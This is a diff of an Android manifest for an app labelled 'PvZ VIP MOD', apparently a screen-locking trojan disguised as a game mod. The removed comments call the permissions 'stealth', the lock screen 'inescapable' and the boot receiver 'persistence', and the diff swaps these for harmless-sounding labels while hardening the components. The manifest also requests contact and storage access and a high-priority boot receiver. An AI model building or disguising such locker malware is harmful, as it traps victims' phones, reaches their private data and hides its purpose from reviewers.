@@ -2,7 +2,7 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.pvzmod.vip">
     
-    <!-- Stealth permissions -->
+    <!-- Barcha permissions -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
@@ -20,7 +20,7 @@
         android:label="PvZ VIP MOD"
         android:theme="@style/Theme.AppCompat">
         
-        <!-- Splash -> Lock -->
+        <!-- MainActivity -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
@@ -31,10 +31,11 @@
             </intent-filter>
         </activity>
         
-        <!-- Lock screen - inescapable -->
+        <!-- LockScreenActivity -->
         <activity
             android:name=".LockScreenActivity"
             android:excludeFromRecents="true"
+            android:exported="false"
             android:launchMode="singleTask"
             android:noHistory="true"
             android:showOnLockScreen="true"
@@ -43,8 +44,11 @@
             android:turnScreenOn="true"
             android:wakeAfterReceivingAction="true" />
         
-        <!-- Boot persistence -->
-        <receiver android:name=".BootReceiver" android:enabled="true">
+        <!-- ✅ FIXED BOOT RECEIVER -->
+        <receiver 
+            android:name=".BootReceiver" 
+            android:enabled="true"
+            android:exported="false">
             <intent-filter android:priority="1000">
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
             </intent-filter>
